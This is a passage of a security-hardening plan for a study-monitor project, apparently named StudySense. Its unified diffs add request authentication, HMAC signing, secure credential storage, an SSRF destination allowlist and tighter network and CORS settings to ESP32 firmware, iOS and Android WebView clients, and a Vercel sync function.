+  server.on("/api/cmd", HTTP_OPTIONS, []() { sendHardenedCorsHeaders(); server.send(204); });
+  server.on("/config", HTTP_OPTIONS, []() { sendHardenedCorsHeaders(); server.send(204); });
+  server.on("/timer", HTTP_OPTIONS, []() { sendHardenedCorsHeaders(); server.send(204); });
+
   server.on("/api/status", HTTP_GET, []() {
-    sendCorsHeaders();
+    sendHardenedCorsHeaders();
+    if (!verifyRequestAuth()) return;
     server.send(200, "application/json", buildStatusJson());
   });
 
   server.on("/status", HTTP_GET, []() {
-    sendCorsHeaders();
+    sendHardenedCorsHeaders();
+    if (!verifyRequestAuth()) return;
     server.send(200, "application/json", buildStatusJson());
   });
 
   server.on("/api/cmd", HTTP_GET, []() {
-    sendCorsHeaders();
+    sendHardenedCorsHeaders();
+    if (!verifyRequestAuth()) return;
     if (server.hasArg("action")) {
       String act = server.arg("action");
       if (act == "startPause") {
@@ -660,12 +929,9 @@
     server.send(200, "application/json", "{\"status\":\"ok\"}");
   });
 
-  server.on("/timer", HTTP_OPTIONS, []() {
-    sendCorsHeaders();
-    server.send(204);
-  });
   server.on("/timer", HTTP_POST, []() {
-    sendCorsHeaders();
+    sendHardenedCorsHeaders();
+    if (!verifyRequestAuth()) return;
     String body = server.arg("plain");
     if (body.indexOf("\"start\"") != -1) {
       if (currentState == STATE_IDLE || currentState == STATE_PAUSED) {
@@ -687,18 +953,36 @@
   });
 
   server.on("/config", HTTP_POST, []() {
-    sendCorsHeaders();
-    String body = server.arg("plain");
+    sendHardenedCorsHeaders();
+    if (!verifyRequestAuth()) return;
+    StaticJsonDocument<512> doc;
+    DeserializationError err = deserializeJson(doc, server.arg("plain"));
+    if (err) {
+      server.send(400, "application/json", "{\"error\":\"Invalid JSON format\"}");
+      return;
+    }
     UserProfile& p = profiles[activeProfileIdx];
-    int sIdx = body.indexOf("\"studyDurationMins\":");
-    if (sIdx != -1) p.studyMins = constrain(body.substring(sIdx + 20).toInt(), 1, 180);
-    int bIdx = body.indexOf("\"breakDurationMins\":");
-    if (bIdx != -1) p.breakMins = constrain(body.substring(bIdx + 20).toInt(), 1, 60);
-    int dIdx = body.indexOf("\"minPostureDistCm\":");
-    if (dIdx != -1) p.minPostureCm = constrain(body.substring(dIdx + 19).toInt(), 10, 60);
-    int zIdx = body.indexOf("\"buzzerEnabled\":");
-    if (zIdx != -1) p.buzzerEnabled = body.substring(zIdx + 16, zIdx + 22).indexOf("true") != -1;
-    saveProfileToPrefs(activeProfileIdx);
+    bool changed = false;
+    if (doc.containsKey("studyDurationMins")) {
+      uint16_t val = constrain((int)doc["studyDurationMins"], 1, 180);
+      if (p.studyMins != val) { p.studyMins = val; changed = true; }
+    }
+    if (doc.containsKey("breakDurationMins")) {
+      uint16_t val = constrain((int)doc["breakDurationMins"], 1, 60);
+      if (p.breakMins != val) { p.breakMins = val; changed = true; }
+    }
+    if (doc.containsKey("minPostureDistCm")) {
+      uint16_t val = constrain((int)doc["minPostureDistCm"], 10, 60);
+      if (p.minPostureCm != val) { p.minPostureCm = val; changed = true; }
+    }
+    if (doc.containsKey("buzzerEnabled")) {
+      bool val = doc["buzzerEnabled"];
+      if (p.buzzerEnabled != val) { p.buzzerEnabled = val; changed = true; }
+    }
+    if (changed) {
+      isConfigDirty = true;
+      lastConfigChangeTime = millis();
+    }
     if (currentState == STATE_IDLE) setTimerForState(STATE_IDLE);
     triggerBuzzer(2, 60, 60);
     server.send(200, "application/json", "{\"status\":\"synced\"}");
@@ -760,15 +1044,61 @@
   currentState = STATE_IDLE;
   setTimerForState(STATE_IDLE);
 
-  // Wi-Fi SoftAP
-  WiFi.mode(WIFI_AP);
-  WiFi.softAPConfig(local_IP, gateway, subnet);
-  WiFi.softAP(AP_SSID, AP_PASS);
-  Serial.print("[Wi-Fi AP Online] SSID: ");
-  Serial.print(AP_SSID);
-  Serial.print(" | IP: http://");
-  Serial.println(WiFi.softAPIP());
+  // Initialize dynamic MAC-derived SSID and CSPRNG Setup PIN
+  uint8_t baseMac[6];
+  esp_read_mac(baseMac, ESP_MAC_WIFI_STA);
+  snprintf(apSsid, sizeof(apSsid), "StudySense-%02X%02X", baseMac[4], baseMac[5]);
 
+  secPrefs.begin("studysense_sec", false);
+  if (!secPrefs.isKey("setup_pin")) {
+    const char charset[] = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ";
+    char setupPin[11];
+    for (int i = 0; i < 10; i++) {
+      setupPin[i] = charset[esp_random() % (sizeof(charset) - 1)];
+    }
+    setupPin[10] = '\0';
+    secPrefs.putString("setup_pin", setupPin);
+    strncpy(apPass, setupPin, sizeof(apPass) - 1);
+  } else {
+    String savedPin = secPrefs.getString("setup_pin");
+    strncpy(apPass, savedPin.c_str(), sizeof(apPass) - 1);
+  }
+  if (secPrefs.isKey("device_psk")) {
+    devicePsk = secPrefs.getString("device_psk");
+  }
+
+  // Register Custom Request Headers for WebServer Authentication
+  const char* authHeaders[] = {
+    "Origin", "Host", "X-StudySense-Timestamp", "X-StudySense-Nonce", "X-StudySense-Signature"
+  };
+  server.collectHeaders(authHeaders, 5);
+
+  // SoftAP Client Disconnect Listener to reclaim DHCP leases
+  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
+    if (event == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
+      Serial.println("[Wi-Fi AP] Client disconnected; clearing DHCP leases.");
+      esp_netif_dhcps_stop(esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"));
+      esp_netif_dhcps_start(esp_netif_get_handle_from_ifkey("WIFI_AP_DEF"));
+    }
+  });
+
+  // Wi-Fi Station (if provisioned) or SoftAP Commissioning
+  String savedSsid = secPrefs.getString("wifi_ssid", "");
+  String savedPass = secPrefs.getString("wifi_pass", "");
+  if (savedSsid.length() > 0) {
+    initWiFiStation(savedSsid, savedPass);
+  } else {
+    isProvisioningMode = true;
+    provisioningStartTime = millis();
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(local_IP, gateway, subnet);
+    WiFi.softAP(apSsid, apPass, 1, 0, 1);
+    Serial.print("[Wi-Fi AP Online] SSID: ");
+    Serial.print(apSsid);
+    Serial.print(" | IP: http://");
+    Serial.println(WiFi.softAPIP());
+  }
+
   // Embedded Web Server
   setupWebServer();
 
@@ -801,9 +1131,17 @@
 // ======================= 13. MAIN LOOP =====================================
 void loop() {
   server.handleClient();
+  checkFlashCommit();
   updateBuzzerEngine();
   unsigned long now = millis();
 
+  // Provisioning Auto-Timeout Watchdog (5 minutes = 300,000 ms)
+  if (isProvisioningMode && (now - provisioningStartTime >= PROVISIONING_TIMEOUT_MS)) {
+    isProvisioningMode = false;
+    WiFi.softAPdisconnect(true);
+    Serial.println("[COMMISSIONING] Provisioning window expired (5m). SoftAP disabled.");
+  }
+
   // 0. Interactive USB Serial Command Listener
   if (Serial.available()) {
     String cmd = Serial.readStringUntil('\n');
@@ -850,10 +1188,20 @@
       Serial.println("[BTN] Pressed down");
     }
   }
-  // Button held down (check for long press > 1.2s)
-  else if (currentBtnReading == LOW && btnIsDown && !btnLongHandled) {
-    if ((now - btnDownTime) >= 1200) {
+  // Button held down (check for commissioning hold >= 5000ms or long press > 1.2s)
+  else if (currentBtnReading == LOW && btnIsDown) {
+    if (!btnCommissioningHandled && (now - btnDownTime) >= 5000) {
+      btnCommissioningHandled = true;
       btnLongHandled = true;
+      isProvisioningMode = true;
+      provisioningStartTime = now;
+      WiFi.mode(WIFI_AP);
+      WiFi.softAPConfig(local_IP, gateway, subnet);
+      WiFi.softAP(apSsid, apPass, 1, 0, 1);
+      Serial.println("[COMMISSIONING] Entered 5-minute provisioning mode via 5s button hold.");
+      triggerBuzzer(3, 80, 80);
+    } else if (!btnLongHandled && (now - btnDownTime) >= 1200) {
+      btnLongHandled = true;
       Serial.println("[BTN] Long press triggered (>1.2s)");
       handleLongButtonPress();
     }
@@ -869,6 +1217,7 @@
         Serial.println("[BTN] Short press registered -> Executing action!");
         handleShortButtonPress();
       }
+      btnCommissioningHandled = false;
     }
   }
   lastBtnState = currentBtnReading;
```

---

### 7.2 Phase 2: iOS WKWebView Client Hardening (`ios/Sources/App/`)

#### Changes in `ios/Sources/App/Info.plist`:
1. Remove `NSAllowsArbitraryLoads: true`.
2. Add `NSAllowsLocalNetworking: true` under `NSAppTransportSecurity`.
3. Add `NSBonjourServices` declaring `_studysense._tcp`.

#### Unified Diff: `ios/Sources/App/Info.plist`

```diff
--- a/ios/Sources/App/Info.plist
+++ b/ios/Sources/App/Info.plist
@@ -35,11 +35,13 @@
 	<key>NSAppTransportSecurity</key>
 	<dict>
-		<key>NSAllowsArbitraryLoads</key>
-		<true/>
 		<key>NSAllowsLocalNetworking</key>
 		<true/>
 	</dict>
 	<key>NSLocalNetworkUsageDescription</key>
 	<string>StudySense connects to your ESP32 Smart Study Monitor over local Wi-Fi to sync posture and study timer data.</string>
+	<key>NSBonjourServices</key>
+	<array>
+		<string>_studysense._tcp</string>
+	</array>
 	<key>NSBluetoothAlwaysUsageDescription</key>
```

#### Unified Diff: `ios/Sources/App/WebView.swift`
Replaces private KVC file flags and cache clearing with Apple Keychain storage and native URLSession HMAC signing bridge, with RFC 1918 + mDNS + cloud SSRF protection, query-string canonical binding, and harmonized 4-argument `JSONSerialization` callbacks `(callbackId, success, statusCode, responseData)`.

```diff
--- a/ios/Sources/App/WebView.swift
+++ b/ios/Sources/App/WebView.swift
@@ -1,5 +1,7 @@
 import SwiftUI
 import WebKit
+import Security
+import CommonCrypto
 
 struct WebView: UIViewRepresentable {
     func makeCoordinator() -> Coordinator {
@@ -7,23 +9,14 @@
     }
 
     func makeUIView(context: Context) -> WKWebView {
-        // Clear all stale cache and website data from old Vercel URL
-        WKWebsiteDataStore.default().removeData(
-            ofTypes: WKWebsiteDataStore.allWebsiteDataTypes(),
-            modifiedSince: Date.distantPast
-        ) { }
-
         let configuration = WKWebViewConfiguration()
         configuration.allowsInlineMediaPlayback = true
         configuration.mediaTypesRequiringUserActionForPlayback = []
 
-        // Enable universal local file access for local storage & HTTP calls
-        configuration.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")
-        configuration.setValue(true, forKey: "allowUniversalAccessFromFileURLs")
-
         // Bridge JS vibration to native iOS Taptic Engine
         let contentController = WKUserContentController()
         contentController.add(context.coordinator, name: "haptic")
+        contentController.add(context.coordinator, name: "secureNativeBridge")
 
         let hapticBridgeScript = WKUserScript(
             source: """
@@ -75,9 +68,173 @@
         private let impactGenerator = UIImpactFeedbackGenerator(style: .medium)
 
         func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
-            guard message.name == "haptic" else { return }
-            impactGenerator.prepare()
-            impactGenerator.impactOccurred()
+            if message.name == "haptic" {
+                impactGenerator.prepare()
+                impactGenerator.impactOccurred()
+            } else if message.name == "secureNativeBridge" {
+                guard let dict = message.body as? [String: Any],
+                      let action = dict["action"] as? String else { return }
+
+                if action == "savePSK", let psk = dict["psk"] as? String {
+                    _ = KeychainHelper.save(key: "studysense_device_psk", data: Data(psk.utf8))
+                } else if action == "sendAuthenticatedRequest",
+                          let urlStr = dict["url"] as? String,
+                          let method = dict["method"] as? String,
+                          let callbackId = dict["callbackId"] as? String,
+                          let url = URL(string: urlStr) {
+
+                    // SSRF Protection: Whitelist cloud domain (HTTPS) and local targets (192.168.4.1, studysense.local, RFC 1918)
+                    guard Self.isAllowedDestination(url) else {
+                        print("🚨 Security Warning: Blocked SSRF attempt to unauthorized destination: \(urlStr)")
+                        dispatchBridgeResponse(
+                            to: message.webView,
+                            callbackId: callbackId,
+                            statusCode: 403,
+                            data: ["error": "SSRF Protection: Destination forbidden"]
+                        )
+                        return
+                    }
+
+                    let body = dict["body"] as? String ?? ""
+                    let psk = KeychainHelper.loadString(key: "studysense_device_psk") ?? ""
+
+                    let ts = String(Int(Date().timeIntervalSince1970))
+                    let nonce = UUID().uuidString.replacingOccurrences(of: "-", with: "").prefix(16).lowercased()
+
+                    // Bind query parameters into HMAC canonical string
+                    let pathWithQuery: String
+                    if let query = url.query, !query.isEmpty {
+                        pathWithQuery = "\(url.path)?\(query)"
+                    } else {
+                        pathWithQuery = url.path
+                    }
+                    let canonical = "\(method.uppercased())\n\(pathWithQuery)\n\(ts)\n\(nonce)\n\(body)"
+                    let sig = HMACSigner.sha256(message: canonical, key: psk)
+
+                    var req = URLRequest(url: url)
+                    req.httpMethod = method
+                    req.setValue(ts, forHTTPHeaderField: "X-StudySense-Timestamp")
+                    req.setValue(String(nonce), forHTTPHeaderField: "X-StudySense-Nonce")
+                    req.setValue(sig, forHTTPHeaderField: "X-StudySense-Signature")
+                    req.setValue("application/json", forHTTPHeaderField: "Content-Type")
+                    if !body.isEmpty { req.httpBody = Data(body.utf8) }
+
+                    URLSession.shared.dataTask(with: req) { [weak self] data, resp, err in
+                        if let err = err {
+                            let status = (resp as? HTTPURLResponse)?.statusCode ?? 500
+                            self?.dispatchBridgeResponse(
+                                to: message.webView,
+                                callbackId: callbackId,
+                                statusCode: status,
+                                data: ["error": err.localizedDescription]
+                            )
+                            return
+                        }
+                        let status = (resp as? HTTPURLResponse)?.statusCode ?? 500
+                        let respJsonObj: Any
+                        if let data = data, let parsed = try? JSONSerialization.jsonObject(with: data, options: []) {
+                            respJsonObj = parsed
+                        } else if let data = data, let text = String(data: data, encoding: .utf8), !text.isEmpty {
+                            respJsonObj = ["raw": text]
+                        } else {
+                            respJsonObj = [String: Any]()
+                        }
+                        self?.dispatchBridgeResponse(
+                            to: message.webView,
+                            callbackId: callbackId,
+                            statusCode: status,
+                            data: respJsonObj
+                        )
+                    }.resume()
+                }
+            }
         }
+
+        private static func isRFC1918IPv4(_ host: String) -> Bool {
+            let parts = host.split(separator: ".", omittingEmptySubsequences: false)
+            guard parts.count == 4 else { return false }
+            var octets = [Int]()
+            for p in parts {
+                guard !p.isEmpty, let val = Int(p), String(val) == p, val >= 0 && val <= 255 else { return false }
+                octets.append(val)
+            }
+            if octets[0] == 10 { return true }
+            if octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31 { return true }
+            if octets[0] == 192 && octets[1] == 168 { return true }
+            return false
+        }
+
+        private static func isAllowedDestination(_ url: URL) -> Bool {
+            guard let scheme = url.scheme?.lowercased(),
+                  let host = url.host?.lowercased() else { return false }
+            if host == "studysense-eight.vercel.app" {
+                return scheme == "https"
+            }
+            if scheme == "http" || scheme == "https" {
+                return host == "192.168.4.1" || host == "studysense.local" || Self.isRFC1918IPv4(host)
+            }
+            return false
+        }
+
+        private func dispatchBridgeResponse(to webView: WKWebView?, callbackId: String, statusCode: Int, data: Any) {
+            let cleaned = callbackId.replacingOccurrences(of: "[^a-zA-Z0-9_-]", with: "", options: .regularExpression)
+            let safeCb = cleaned.isEmpty ? "cb_default" : cleaned
+            let success = (200..<300).contains(statusCode)
+            let validData: Any = JSONSerialization.isValidJSONObject(data) ? data : ["raw": String(describing: data)]
+            guard let argsData = try? JSONSerialization.data(withJSONObject: [safeCb, success, statusCode, validData], options: []),
+                  let rawArgsJson = String(data: argsData, encoding: .utf8),
+                  rawArgsJson.count >= 2 else {
+                return
+            }
+            let safeArgsJson = rawArgsJson
+                .replacingOccurrences(of: "\u{2028}", with: "\\u2028")
+                .replacingOccurrences(of: "\u{2029}", with: "\\u2029")
+            let argList = String(safeArgsJson.dropFirst().dropLast())
+            DispatchQueue.main.async {
+                webView?.evaluateJavaScript("window._onNativeBridgeResponse(\(argList));", completionHandler: nil)
+            }
+        }
     }
 }
+
+struct KeychainHelper {
+    static func save(key: String, data: Data) -> Bool {
+        let query = [
+            kSecClass as String: kSecClassGenericPassword,
+            kSecAttrService as String: "com.studysense.app",
+            kSecAttrAccount as String: key,
+            kSecValueData as String: data,
+            kSecAttrAccessible as String: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
+        ] as [String: Any]
+        SecItemDelete(query as CFDictionary)
+        return SecItemAdd(query as CFDictionary, nil) == errSecSuccess
+    }
+
+    static func loadString(key: String) -> String? {
+        let query = [
+            kSecClass as String: kSecClassGenericPassword,
+            kSecAttrService as String: "com.studysense.app",
+            kSecAttrAccount as String: key,
+            kSecReturnData as String: true,
+            kSecMatchLimit as String: kSecMatchLimitOne
+        ] as [String: Any]
+        var item: CFTypeRef?
+        guard SecItemCopyMatching(query as CFDictionary, &item) == errSecSuccess,
+              let data = item as? Data else { return nil }
+        return String(data: data, encoding: .utf8)
+    }
+}
+
+struct HMACSigner {
+    static func sha256(message: String, key: String) -> String {
+        guard let keyData = key.data(using: .utf8),
+              let msgData = message.data(using: .utf8) else { return "" }
+        var hmac = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
+        keyData.withUnsafeBytes { kBytes in
+            msgData.withUnsafeBytes { mBytes in
+                CCHmac(CCHmacAlgorithm(kCCHmacAlgSHA256), kBytes.baseAddress, keyData.count, mBytes.baseAddress, msgData.count, &hmac)
+            }
+        }
+        return hmac.map { String(format: "%02x", $0) }.joined()
+    }
+}
```

---

### 7.3 Phase 3: Android WebView Client Hardening (`android/`)

#### 1. Create `android/res/xml/network_security_config.xml`:
Enforces cleartext restrictions with valid domain configurations (avoiding invalid CIDR notation):

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <!-- Deny cleartext globally by default -->
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>

    <!-- Permit local HTTP strictly to ESP32 SoftAP and mDNS targets -->
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="false">192.168.4.1</domain>
        <domain includeSubdomains="false">studysense.local</domain>
    </domain-config>
</network-security-config>
```

> **Android Cleartext Policy & Station Reachability Note**: Android's `network_security_config.xml` `<domain>` element does not support CIDR ranges or wildcard IP patterns (`192.168.*.*`). Because the ESP32 firmware runs `MDNS.begin("studysense")`, Android Station-mode traffic resolves cleanly to `http://studysense.local` while preserving `cleartextTrafficPermitted="false"` globally for all external traffic. At the bridge layer (`MainActivity.java`), `isAllowedDestination()` additionally permits RFC 1918 private IPv4 subnets (`192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`) alongside `192.168.4.1`, `studysense.local`, and `https://studysense-eight.vercel.app`.

#### Unified Diff: `android/AndroidManifest.xml`

```diff
--- a/android/AndroidManifest.xml
+++ b/android/AndroidManifest.xml
@@ -10,13 +10,14 @@

     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />

     <application
-        android:allowBackup="true"
+        android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:label="StudySense"
         android:theme="@style/AppTheme"
-        android:usesCleartextTraffic="true">
+        android:networkSecurityConfig="@xml/network_security_config">

         <activity
             android:name=".MainActivity"
```

#### Unified Diff: `android/src/com/studysense/app/MainActivity.java`
Implements hardware EncryptedSharedPreferences, WebViewAssetLoader, RFC 1918 + mDNS + cloud SSRF destination whitelisting, query-parameter HMAC canonicalization, alphanumeric callback ID sanitization, and harmonized 4-argument `JSONArray`/`JSONObject`-escaped callbacks `(callbackId, success, statusCode, responseData)` streaming full `conn.getInputStream()` / `conn.getErrorStream()` payloads without `SyntaxError` injection risks.

```diff
--- a/android/src/com/studysense/app/MainActivity.java
+++ b/android/src/com/studysense/app/MainActivity.java
@@ -4,19 +4,55 @@
 import android.app.Activity;
 import android.graphics.Color;
 import android.os.Bundle;
+import android.webkit.JavascriptInterface;
+import androidx.webkit.WebViewAssetLoader;
+import androidx.security.crypto.EncryptedSharedPreferences;
+import androidx.security.crypto.MasterKey;
+import android.content.SharedPreferences;
 import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.webkit.WebResourceRequest;
+import android.webkit.WebResourceResponse;
+import java.security.Key;
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.io.OutputStream;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.BufferedReader;
+import java.util.UUID;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import org.json.JSONTokener;
 
 public class MainActivity extends Activity {
     private WebView webView;
+    private SharedPreferences securePrefs;
 
     @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
+        try {
+            MasterKey masterKey = new MasterKey.Builder(this)
+                .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
+                .build();
+            securePrefs = EncryptedSharedPreferences.create(
+                this,
+                "studysense_sec_store",
+                masterKey,
+                EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
+                EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
+            );
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
         webView = new WebView(this);
         webView.setBackgroundColor(Color.parseColor("#0b0f19"));
         setContentView(webView);
@@ -24,16 +60,193 @@
         WebSettings settings = webView.getSettings();
         settings.setJavaScriptEnabled(true);
         settings.setDomStorageEnabled(true);
-        settings.setAllowFileAccess(true);
+        settings.setAllowFileAccess(false);
+        settings.setAllowContentAccess(false);
         settings.setMediaPlaybackRequiresUserGesture(false);
-        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+        settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
         settings.setUserAgentString(settings.getUserAgentString() + " StudySenseAndroid");
 
-        webView.setWebViewClient(new WebViewClient());
+        final WebViewAssetLoader assetLoader = new WebViewAssetLoader.Builder()
+            .addPathHandler("/assets/", new WebViewAssetLoader.AssetsPathHandler(this))
+            .build();
+
+        webView.setWebViewClient(new WebViewClient() {
+            @Override
+            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
+                return assetLoader.shouldInterceptRequest(request.getUrl());
+            }
+        });
         webView.setWebChromeClient(new WebChromeClient());
-        webView.loadUrl("file:///android_asset/index.html");
+        webView.addJavascriptInterface(new SecureAndroidBridge(), "AndroidSecureBridge");
+        webView.loadUrl("https://appassets.androidplatform.net/assets/index.html");
     }
 
+    private class SecureAndroidBridge {
+        @JavascriptInterface
+        public void savePSK(String psk) {
+            if (securePrefs != null && psk != null && psk.length() >= 32) {
+                securePrefs.edit().putString("device_psk", psk).apply();
+            }
+        }
+
+        private boolean isRFC1918IPv4(String host) {
+            if (host == null) return false;
+            String[] parts = host.split("\\.", -1);
+            if (parts.length != 4) return false;
+            int[] octets = new int[4];
+            for (int i = 0; i < 4; i++) {
+                if (!parts[i].matches("\\d{1,3}")) return false;
+                int val = Integer.parseInt(parts[i]);
+                if (val < 0 || val > 255 || !String.valueOf(val).equals(parts[i])) return false;
+                octets[i] = val;
+            }
+            if (octets[0] == 10) return true;
+            if (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) return true;
+            if (octets[0] == 192 && octets[1] == 168) return true;
+            return false;
+        }
+
+        private boolean isAllowedDestination(URL url) {
+            if (url == null || url.getHost() == null || url.getProtocol() == null) return false;
+            String scheme = url.getProtocol().toLowerCase();
+            String host = url.getHost().toLowerCase();
+            if (host.equals("studysense-eight.vercel.app")) {
+                return scheme.equals("https");
+            }
+            if (scheme.equals("http") || scheme.equals("https")) {
+                return host.equals("192.168.4.1") || host.equals("studysense.local") || isRFC1918IPv4(host);
+            }
+            return false;
+        }
+
+        private void dispatchBridgeResponse(String callbackId, int statusCode, Object data) {
+            String safeCb = (callbackId != null ? callbackId : "").replaceAll("[^a-zA-Z0-9_-]", "");
+            if (safeCb.isEmpty()) safeCb = "cb_default";
+            boolean success = (statusCode >= 200 && statusCode < 300);
+
+            Object safeData;
+            if (data instanceof JSONObject || data instanceof JSONArray) {
+                safeData = data;
+            } else if (data instanceof String) {
+                String text = ((String) data).trim();
+                if (text.isEmpty()) {
+                    safeData = new JSONObject();
+                } else {
+                    try {
+                        Object parsed = new JSONTokener(text).nextValue();
+                        if (parsed instanceof JSONObject || parsed instanceof JSONArray) {
+                            safeData = parsed;
+                        } else {
+                            safeData = new JSONObject().put("raw", text);
+                        }
+                    } catch (Exception ignored) {
+                        try {
+                            safeData = new JSONObject().put("raw", text);
+                        } catch (Exception e2) {
+                            safeData = new JSONObject();
+                        }
+                    }
+                }
+            } else {
+                safeData = new JSONObject();
+            }
+
+            try {
+                JSONArray args = new JSONArray();
+                args.put(safeCb);
+                args.put(success);
+                args.put(statusCode);
+                args.put(safeData);
+                String argsJson = args.toString()
+                    .replace("\u2028", "\\u2028")
+                    .replace("\u2029", "\\u2029");
+                String argList = argsJson.substring(1, argsJson.length() - 1);
+                final String js = "window._onNativeBridgeResponse(" + argList + ");";
+                runOnUiThread(() -> webView.evaluateJavascript(js, null));
+            } catch (Exception e) {
+                final String fallbackCb = JSONObject.quote(safeCb);
+                runOnUiThread(() -> webView.evaluateJavascript(
+                    "window._onNativeBridgeResponse(" + fallbackCb + ", false, 500, {\"error\":\"Serialization error\"});",
+                    null
+                ));
+            }
+        }
+
+        @JavascriptInterface
+        public void executeAuthenticatedRequest(String urlStr, String method, String body, String callbackId) {
+            new Thread(() -> {
+                try {
+                    URL url = new URL(urlStr);
+
+                    // SSRF Protection: Whitelist cloud domain (HTTPS) and local targets (192.168.4.1, studysense.local, RFC 1918)
+                    if (!isAllowedDestination(url)) {
+                        System.err.println("Security: Blocked unauthorized bridge URL destination: " + urlStr);
+                        JSONObject errObj = new JSONObject();
+                        errObj.put("error", "SSRF Protection: Destination forbidden");
+                        dispatchBridgeResponse(callbackId, 403, errObj);
+                        return;
+                    }
+
+                    String psk = securePrefs != null ? securePrefs.getString("device_psk", "") : "";
+                    String ts = String.valueOf(System.currentTimeMillis() / 1000);
+                    String nonce = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
+
+                    // Reconstruct query parameters in canonical string
+                    String pathWithQuery = url.getPath();
+                    if (url.getQuery() != null && !url.getQuery().isEmpty()) {
+                        pathWithQuery += "?" + url.getQuery();
+                    }
+                    String canonical = method.toUpperCase() + "\n" + pathWithQuery + "\n" + ts + "\n" + nonce + "\n" + (body != null ? body : "");
+
+                    Mac sha256_HMAC = Mac.getInstance("HmacSHA256");
+                    SecretKeySpec secret_key = new SecretKeySpec(psk.getBytes("UTF-8"), "HmacSHA256");
+                    sha256_HMAC.init(secret_key);
+                    byte[] hash = sha256_HMAC.doFinal(canonical.getBytes("UTF-8"));
+                    StringBuilder hexSig = new StringBuilder();
+                    for (byte b : hash) hexSig.append(String.format("%02x", b));
+
+                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                    conn.setRequestMethod(method.toUpperCase());
+                    conn.setRequestProperty("X-StudySense-Timestamp", ts);
+                    conn.setRequestProperty("X-StudySense-Nonce", nonce);
+                    conn.setRequestProperty("X-StudySense-Signature", hexSig.toString());
+                    conn.setRequestProperty("Content-Type", "application/json");
+                    conn.setConnectTimeout(3000);
+                    conn.setReadTimeout(3000);
+
+                    if ("POST".equalsIgnoreCase(method) && body != null) {
+                        conn.setDoOutput(true);
+                        try (OutputStream os = conn.getOutputStream()) {
+                            os.write(body.getBytes("UTF-8"));
+                        }
+                    }
+
+                    int code = conn.getResponseCode();
+                    InputStream is = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
+                    StringBuilder sb = new StringBuilder();
+                    if (is != null) {
+                        try (BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"))) {
+                            char[] buf = new char[1024];
+                            int n;
+                            while ((n = reader.read(buf)) != -1) {
+                                sb.append(buf, 0, n);
+                            }
+                        }
+                    }
+                    dispatchBridgeResponse(callbackId, code, sb.toString());
+                } catch (Exception e) {
+                    try {
+                        JSONObject errObj = new JSONObject();
+                        errObj.put("error", "Network Error");
+                        dispatchBridgeResponse(callbackId, 500, errObj);
+                    } catch (Exception ignored) {
+                        dispatchBridgeResponse(callbackId, 500, "{}");
+                    }
+                }
+            }).start();
+        }
+    }
+
     @Override
     public void onBackPressed() {
         if (webView != null && webView.canGoBack()) {
```

---

### 7.4 Phase 4: Vercel Cloud Serverless Function Hardening (`api/sync.js`)

Implements strict Bearer JWT authentication, mandatory `exp` expiration claim validation, zero static dev secret fallback (fails closed with HTTP 500 if unset), constant-time signature evaluation using SHA-256 pre-hashed buffers (eliminating `RangeError` timing leaks), and an in-memory fallback store for zero-dependency local development when KV environment variables are not configured.

#### Unified Diff: `api/sync.js`

```diff
--- a/api/sync.js
+++ b/api/sync.js
@@ -1,54 +1,148 @@
 // Vercel Serverless Function: StudySense Cloud Sync Engine
 // Persists and synchronizes user profiles, study timer history, and preferences across devices.
+import crypto from 'crypto';
 
 let memoryStore = {};
 
-export default async function handler(req, res) {
-  // Universal CORS headers for Web, PWA, iOS WKWebView, and Android WebView
-  res.setHeader('Access-Control-Allow-Credentials', 'true');
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
-  res.setHeader(
-    'Access-Control-Allow-Headers',
-    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, x-user-id'
-  );
+const ALLOWED_ORIGINS = [
+  'https://studysense-eight.vercel.app',
+  'https://appassets.androidplatform.net',
+  'http://localhost:3000'
+];
 
-  if (req.method === 'OPTIONS') {
-    res.status(200).end();
-    return;
+function setCorsHeaders(req, res) {
+  const origin = req.headers.origin;
+  if (ALLOWED_ORIGINS.includes(origin)) {
+    res.setHeader('Access-Control-Allow-Origin', origin);
+    res.setHeader('Access-Control-Allow-Credentials', 'true');
